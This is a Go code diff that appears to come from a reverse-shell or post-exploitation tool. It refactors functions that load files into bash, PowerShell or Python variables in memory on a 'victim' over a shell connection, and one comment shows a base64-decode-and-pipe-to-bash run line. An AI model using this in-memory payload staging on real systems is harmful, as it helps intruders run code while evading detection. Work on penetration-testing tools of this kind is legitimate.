@@ -22,6 +22,7 @@ type Transferer struct {
 	sessionID   string
 	platform    string       // "windows", "linux", or "unknown"
 	progressFn  func(string) // Optional callback for progress updates (TUI mode)
+	doneFn      func()       // Optional callback when progress-driven transfer ends
 	ptyUpgraded bool         // Use smaller chunks for PTY-upgraded shells
 }
 
@@ -66,6 +67,29 @@ func waitForRemoteMarker(ctx context.Context, conn net.Conn, marker string) erro
 			conn.SetReadDeadline(time.Time{})
 			return err
 		}
+	}
+}
+
+func writeWithContext(ctx context.Context, conn net.Conn, data []byte) error {
+	for {
+		select {
+		case <-ctx.Done():
+			conn.SetWriteDeadline(time.Time{})
+			return ctx.Err()
+		default:
+		}
+
+		conn.SetWriteDeadline(time.Now().Add(250 * time.Millisecond))
+		_, err := conn.Write(data)
+		if err == nil {
+			conn.SetWriteDeadline(time.Time{})
+			return nil
+		}
+		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
+			continue
+		}
+		conn.SetWriteDeadline(time.Time{})
+		return err
 	}
 }
 
@@ -169,6 +193,9 @@ func effectiveUploadRemotePath(localPath, remotePath string) string {
 func (t *Transferer) done(text string) {
 	if t.progressFn == nil {
 		fmt.Println(text)
+	}
+	if t.doneFn != nil {
+		t.doneFn()
 	}
 }
 
@@ -394,7 +421,7 @@ func (t *Transferer) Upload(ctx context.Context, localPath, remotePath string) e
 // Returns the variable name for later use (e.g., echo "$varName" | base64 -d | bash)
 // UploadToBashVariable uploads a file to a bash variable (in-memory, no disk write on victim)
 // The variable contains base64-encoded data for later execution
-func (t *Transferer) UploadToBashVariable(ctx context.Context, localPath, varName string) error {
+func (t *Transferer) UploadToBashVariable(ctx context.Context, localPath, varName string) (err error) {
 	// Read local file
 	data, err := os.ReadFile(localPath)
 	if err != nil {
@@ -403,10 +430,19 @@ func (t *Transferer) UploadToBashVariable(ctx context.Context, localPath, varNam
 
 	fileSize := len(data)
 
-	// Start spinner
-	spinner := ui.NewSpinner()
-	spinner.Start(fmt.Sprintf("Loading %s to memory... 0 B / %s (0%s)", filepath.Base(localPath), formatSize(fileSize), "%"))
-	defer spinner.Stop()
+	var spinner *ui.Spinner
+	if t.progressFn == nil {
+		spinner = ui.NewSpinner()
+		spinner.Start(fmt.Sprintf("Loading %s to memory... 0 B / %s (0%s)", filepath.Base(localPath), formatSize(fileSize), "%"))
+		defer spinner.Stop()
+	} else {
+		t.progress(fmt.Sprintf("Loading %s to memory... 0 B / %s (0%s)", filepath.Base(localPath), formatSize(fileSize), "%"))
+	}
+	defer func() {
+		if err != nil && t.doneFn != nil {
+			t.doneFn()
+		}
+	}()
 
 	// Drain leftover data
 	t.drainConnection()
@@ -416,12 +452,18 @@ func (t *Transferer) UploadToBashVariable(ctx context.Context, localPath, varNam
 
 	// Initialize empty variable
 	initCmd := fmt.Sprintf("%s=''\n", varName)
-	t.conn.Write([]byte(initCmd))
+	if err := writeWithContext(ctx, t.conn, []byte(initCmd)); err != nil {
+		return fmt.Errorf("connection lost during upload: %w", err)
+	}
 	time.Sleep(50 * time.Millisecond)
 
 	// Send file in chunks, concatenating to variable
 	config := DefaultTransferConfig()
-	chunks := splitIntoChunks(encoded, config.ChunkSize)
+	chunkSize := config.ChunkSize
+	if t.ptyUpgraded {
+		chunkSize = 1024
+	}
+	chunks := splitIntoChunks(encoded, chunkSize)
 
 	bytesSent := 0
 
@@ -429,17 +471,14 @@ func (t *Transferer) UploadToBashVariable(ctx context.Context, localPath, varNam
 		// Check for cancellation
 		select {
 		case <-ctx.Done():
-			// Cleanup variable on cancel
-			t.conn.Write([]byte(fmt.Sprintf("unset %s\n", varName)))
-			return fmt.Errorf("upload cancelled by user")
+			return ctx.Err()
 		default:
 		}
 
 		// Append chunk to variable (using += operator)
 		// Note: We keep it base64-encoded in the variable for now
 		cmd := fmt.Sprintf("%s+='%s'\n", varName, chunk)
-		_, err := t.conn.Write([]byte(cmd))
-		if err != nil {
+		if err := writeWithContext(ctx, t.conn, []byte(cmd)); err != nil {
 			return fmt.Errorf("connection lost during upload: %w", err)
 		}
 
@@ -456,8 +495,13 @@ func (t *Transferer) UploadToBashVariable(ctx context.Context, localPath, varNam
 
 		// Update spinner every 50 chunks or on last chunk
 		if i%50 == 0 || i == len(chunks)-1 {
-			spinner.Update(fmt.Sprintf("Loading %s to memory... %s / %s (%d%s)",
-				filepath.Base(localPath), formatSize(actualBytes), formatSize(fileSize), percent, "%"))
+			msg := fmt.Sprintf("Loading %s to memory... %s / %s (%d%s)",
+				filepath.Base(localPath), formatSize(actualBytes), formatSize(fileSize), percent, "%")
+			if spinner != nil {
+				spinner.Update(msg)
+			} else {
+				t.progress(msg)
+			}
 		}
 
 		// Drain buffer every 25 chunks
@@ -470,15 +514,17 @@ func (t *Transferer) UploadToBashVariable(ctx context.Context, localPath, varNam
 	// Variable is now loaded with base64-encoded content
 	// No need to decode here - will be decoded during execution
 
-	spinner.Stop()
-	fmt.Println(ui.Success(fmt.Sprintf("Loaded %s into memory (%s)", filepath.Base(localPath), formatSize(fileSize))))
+	if spinner != nil {
+		spinner.Stop()
+	}
+	t.done(ui.Success(fmt.Sprintf("Loaded %s into memory (%s)", filepath.Base(localPath), formatSize(fileSize))))
 
 	t.drainConnection()
 	return nil
 }
 
 // UploadToPowerShellVariable uploads a file to a PowerShell variable (in-memory, no disk write on victim)
-func (t *Transferer) UploadToPowerShellVariable(ctx context.Context, localPath, varName string) error {
+func (t *Transferer) UploadToPowerShellVariable(ctx context.Context, localPath, varName string) (err error) {
 	// Read local file
 	data, err := os.ReadFile(localPath)
 	if err != nil {
@@ -487,10 +533,19 @@ func (t *Transferer) UploadToPowerShellVariable(ctx context.Context, localPath, 
 
 	fileSize := len(data)
 
-	// Start spinner
-	spinner := ui.NewSpinner()
-	spinner.Start(fmt.Sprintf("Loading %s to memory... 0 B / %s (0%s)", filepath.Base(localPath), formatSize(fileSize), "%"))
-	defer spinner.Stop()
+	var spinner *ui.Spinner
+	if t.progressFn == nil {
+		spinner = ui.NewSpinner()
+		spinner.Start(fmt.Sprintf("Loading %s to memory... 0 B / %s (0%s)", filepath.Base(localPath), formatSize(fileSize), "%"))
+		defer spinner.Stop()
+	} else {
+		t.progress(fmt.Sprintf("Loading %s to memory... 0 B / %s (0%s)", filepath.Base(localPath), formatSize(fileSize), "%"))
+	}
+	defer func() {
+		if err != nil && t.doneFn != nil {
+			t.doneFn()
+		}
+	}()
 
 	// Drain leftover data
 	t.drainConnection()
@@ -500,7 +555,9 @@ func (t *Transferer) UploadToPowerShellVariable(ctx context.Context, localPath, 
 
 	// Initialize empty variable (PowerShell syntax)
 	initCmd := fmt.Sprintf("$%s = ''\r\n", varName)
-	t.conn.Write([]byte(initCmd))
+	if err := writeWithContext(ctx, t.conn, []byte(initCmd)); err != nil {
+		return fmt.Errorf("connection lost during upload: %w", err)
+	}
 	time.Sleep(100 * time.Millisecond)
 
 	// Use small chunk size (1KB) to avoid quote escaping issues
@@ -513,9 +570,7 @@ func (t *Transferer) UploadToPowerShellVariable(ctx context.Context, localPath, 
 		// Check for cancellation
 		select {
 		case <-ctx.Done():
-			// Cleanup variable on cancel
-			t.conn.Write([]byte(fmt.Sprintf("Remove-Variable -Name %s\r\n", varName)))
-			return fmt.Errorf("upload cancelled by user")
+			return ctx.Err()
 		default:
 		}
 
@@ -523,8 +578,7 @@ func (t *Transferer) UploadToPowerShellVariable(ctx context.Context, localPath, 
 		// Escape single quotes by doubling them
 		escapedChunk := strings.ReplaceAll(chunk, "'", "''")
 		cmd := fmt.Sprintf("$%s += '%s'\r\n", varName, escapedChunk)
-		_, err := t.conn.Write([]byte(cmd))
-		if err != nil {
+		if err := writeWithContext(ctx, t.conn, []byte(cmd)); err != nil {
 			return fmt.Errorf("connection lost during upload: %w", err)
 		}
 
@@ -541,8 +595,13 @@ func (t *Transferer) UploadToPowerShellVariable(ctx context.Context, localPath, 
 
 		// Update spinner every 20 chunks or on last chunk
 		if i%20 == 0 || i == len(chunks)-1 {
-			spinner.Update(fmt.Sprintf("Loading %s to memory... %s / %s (%d%s)",
-				filepath.Base(localPath), formatSize(actualBytes), formatSize(fileSize), percent, "%"))
+			msg := fmt.Sprintf("Loading %s to memory... %s / %s (%d%s)",
+				filepath.Base(localPath), formatSize(actualBytes), formatSize(fileSize), percent, "%")
+			if spinner != nil {
+				spinner.Update(msg)
+			} else {
+				t.progress(msg)
+			}
 		}
 
 		// Drain buffer every 10 chunks (more frequent for PowerShell)
@@ -552,15 +611,17 @@ func (t *Transferer) UploadToPowerShellVariable(ctx context.Context, localPath, 
 		}
 	}
 
-	spinner.Stop()
-	fmt.Println(ui.Success(fmt.Sprintf("Loaded %s into memory (%s)", filepath.Base(localPath), formatSize(fileSize))))
+	if spinner != nil {
+		spinner.Stop()
+	}
+	t.done(ui.Success(fmt.Sprintf("Loaded %s into memory (%s)", filepath.Base(localPath), formatSize(fileSize))))
 
 	t.drainConnection()
 	return nil
 }
 
 // UploadToPythonVariable uploads a file to a Python variable (in-memory, no disk write on victim)
-func (t *Transferer) UploadToPythonVariable(ctx context.Context, localPath, varName string) error {
+func (t *Transferer) UploadToPythonVariable(ctx context.Context, localPath, varName string) (err error) {
 	// Read local file
 	data, err := os.ReadFile(localPath)
 	if err != nil {
@@ -569,10 +630,19 @@ func (t *Transferer) UploadToPythonVariable(ctx context.Context, localPath, varN
 
 	fileSize := len(data)
 
-	// Start spinner
-	spinner := ui.NewSpinner()
-	spinner.Start(fmt.Sprintf("Loading %s to memory... 0 B / %s (0%s)", filepath.Base(localPath), formatSize(fileSize), "%"))
-	defer spinner.Stop()
+	var spinner *ui.Spinner
+	if t.progressFn == nil {
+		spinner = ui.NewSpinner()
+		spinner.Start(fmt.Sprintf("Loading %s to memory... 0 B / %s (0%s)", filepath.Base(localPath), formatSize(fileSize), "%"))
+		defer spinner.Stop()
+	} else {
+		t.progress(fmt.Sprintf("Loading %s to memory... 0 B / %s (0%s)", filepath.Base(localPath), formatSize(fileSize), "%"))
+	}
+	defer func() {
+		if err != nil && t.doneFn != nil {
+			t.doneFn()
+		}
+	}()
 
 	// Drain leftover data
 	t.drainConnection()
@@ -582,7 +652,9 @@ func (t *Transferer) UploadToPythonVariable(ctx context.Context, localPath, varN
 
 	// Initialize empty variable (Python syntax)
 	initCmd := fmt.Sprintf("%s = ''\n", varName)
-	t.conn.Write([]byte(initCmd))
+	if err := writeWithContext(ctx, t.conn, []byte(initCmd)); err != nil {
+		return fmt.Errorf("connection lost during upload: %w", err)
+	}
 	time.Sleep(50 * time.Millisecond)
 
 	// Use small chunk size (1KB) to avoid quote escaping issues
@@ -595,9 +667,7 @@ func (t *Transferer) UploadToPythonVariable(ctx context.Context, localPath, varN
 		// Check for cancellation
 		select {
 		case <-ctx.Done():
-			// Cleanup variable on cancel
-			t.conn.Write([]byte(fmt.Sprintf("del %s\n", varName)))
-			return fmt.Errorf("upload cancelled by user")
+			return ctx.Err()
 		default:
 		}
 
@@ -605,8 +675,7 @@ func (t *Transferer) UploadToPythonVariable(ctx context.Context, localPath, varN
 		// Escape single quotes for Python strings
 		escapedChunk := strings.ReplaceAll(chunk, "'", "\\'")
 		cmd := fmt.Sprintf("%s += '%s'\n", varName, escapedChunk)
-		_, err := t.conn.Write([]byte(cmd))
-		if err != nil {
+		if err := writeWithContext(ctx, t.conn, []byte(cmd)); err != nil {
 			return fmt.Errorf("connection lost during upload: %w", err)
 		}
 
@@ -623,8 +692,13 @@ func (t *Transferer) UploadToPythonVariable(ctx context.Context, localPath, varN
 
 		// Update spinner every 50 chunks or on last chunk
 		if i%50 == 0 || i == len(chunks)-1 {
-			spinner.Update(fmt.Sprintf("Loading %s to memory... %s / %s (%d%s)",
-				filepath.Base(localPath), formatSize(actualBytes), formatSize(fileSize), percent, "%"))
+			msg := fmt.Sprintf("Loading %s to memory... %s / %s (%d%s)",
+				filepath.Base(localPath), formatSize(actualBytes), formatSize(fileSize), percent, "%")
+			if spinner != nil {
+				spinner.Update(msg)
+			} else {
+				t.progress(msg)
+			}
 		}
 
 		// Drain buffer every 25 chunks
@@ -634,8 +708,10 @@ func (t *Transferer) UploadToPythonVariable(ctx context.Context, localPath, varN
 		}
 	}
 
-	spinner.Stop()
-	fmt.Println(ui.Success(fmt.Sprintf("Loaded %s into memory (%s)", filepath.Base(localPath), formatSize(fileSize))))
+	if spinner != nil {
+		spinner.Stop()
+	}
+	t.done(ui.Success(fmt.Sprintf("Loaded %s into memory (%s)", filepath.Base(localPath), formatSize(fileSize))))
 
 	t.drainConnection()
 	return nil
